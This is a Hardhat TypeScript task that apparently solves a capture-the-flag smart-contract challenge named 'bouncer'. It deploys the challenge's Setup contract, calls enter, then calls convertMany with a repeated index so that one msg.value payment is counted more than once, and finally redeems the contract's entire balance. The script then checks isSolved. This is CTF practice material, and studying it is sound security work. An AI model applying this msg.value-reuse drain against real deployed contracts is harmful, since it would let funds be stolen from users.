import { Contract } from 'ethers'
import { formatEther, parseEther } from 'ethers/lib/utils'
import { task } from 'hardhat/config'
const ETH = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE'

function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

task('bouncer')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/bouncer/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory('contracts/bouncer/Setup.sol:Setup')
      ).deploy({ value: parseEther('100') })
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const bouncer = await ethers.getContractAt(
      'contracts/bouncer/Bouncer.sol:Bouncer',
      await setup.bouncer(),
    )
    console.log('Bouncer')
    console.log('  at', bouncer.address)

    // perform exploit

    console.log(
      await bouncer.enter(ETH, parseEther('100'), {
        value: parseEther('1'),
      }),
    )

    // Have to sleep due to timing issues with block.timestamp and bouncer blocking entry
    console.log('sleeping...')
    await sleep(1000)
    console.log(
      await bouncer.convertMany(signer.address, [0, 0], {
        value: parseEther('100'),
      }),
    )

    console.log(
      await bouncer.redeem(
        ETH,
        await ethers.provider.getBalance(bouncer.address),
      ),
    )

    // verify

    console.log('Success?', await setup.isSolved())
  })
